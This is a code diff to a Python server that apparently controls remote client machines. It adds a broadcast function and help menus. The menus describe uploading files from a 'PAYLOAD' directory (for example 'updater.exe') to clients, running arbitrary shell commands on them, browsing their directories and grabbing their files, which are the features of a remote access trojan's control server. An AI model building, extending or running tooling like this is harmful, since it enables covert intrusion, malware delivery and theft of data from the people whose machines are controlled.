@@ -214,6 +214,11 @@ class BasicTemplate(Process):
         send_msg = base64.b64encode(msg.encode(self._format_code))
         handler.conn.send(send_msg)
     
+    def _send_msg_toall(self, msg):
+        for c in self.CONNECTIONS:
+            self._send_msg(msg, self.CONNECTIONS[c])
+
+    
     def _unpack_sys_cmd(self, command):
         msg = command.split(self.sys_msg)
         cmd = []
@@ -307,6 +312,24 @@ class BasicTemplate(Process):
             while True:
                 sleep(20)
         self.Msg("ENDDDDDDDDD")
+    
+    def __help(self):
+        self.Msg(f"\n----------------- < {self.name} > Commands List -------------\n", end=False)
+        self.Msg("----- ss start            - Start server listening\n", end=False)
+        self.Msg("----- ss stop             - Stop server listening\n", end=False)
+        self.Msg("----- ss show             - Show all clients connected to server", end=False)
+        self.Msg("----- ss saveinfo         - Show and save all information about connected clients", end=False)
+        self.Msg("----- ss @<client_id>     - Make direct connection to client. ex: 'ss @1' - connect to clinet id 1", end=False)
+        self.Msg('------------- !!!!! Put commands with space in quotation marks "" !!!!!!!!! ------------', end=False)
+        self.Msg('----- ex:  ss @3 hello  - Send "hello" to client number 3', end=False)
+        self.Msg('----- ex: ss start  or ss "start" ', end=False)
+        self.Msg("----------------------------------------------------------------------------------------\n")
+
+    def _help(self):
+        self.__help()
+    def help(self):
+        self._help()
+
 
 
 
@@ -348,6 +371,8 @@ class ServerControler(Thread):
             self.SERVER.Msg(self.SERVER.show_config(), level=True)
         elif cmd == "$conf":
             self.SERVER._send_config()
+        elif cmd == "help":
+            self.SERVER.help()
         elif cmd.startswith("info"):
             client_id = cmd.lstrip("info").strip(" ")
             self.SERVER._client_info(client_id)
@@ -509,6 +534,17 @@ class AdvTemplate(BasicTemplate):
             self._download_item(cmd[1], cmd[2], handler)
         else:
             self.Msg(f"[{self.name}] Client: {handler.Addr} send unknown sys command: {str(cmd)}")
+    
+    def help(self):
+        self._help()
+        self.Msg(f"----------------- < {self.name} Extra Commands -----------------\n", end=False)
+        self.Msg("----- ss up <client_id> <filename>    - Upload file to client. File must be in PAYLOAD directory !!\n", end=False)
+        self.Msg('- ex: ss "up @1 updater.exe"  - send updater_exe to client no. 1\n\n', end=False)
+        self.Msg(" !!!! If you have direct connection with client you can use: !!!! \n", end=False)
+        self.Msg("----- ss pwd                  - Displays the location of the client\n", end=False)
+        self.Msg("----- ss cd <dir_name>        - Change directory. ex: ss 'cd c:/windows'\n", end=False)
+        self.Msg("----- ss <command_shell>      - Execute shell command CMD. ex: ss 'ipconfig /all' , ex: ss 'mkdir MyDir'\n", end=False)
+        self.Msg('----- ss "grab <file_name>"  - download file_name from client and put to server output dir\n', end=False)
     
    
 
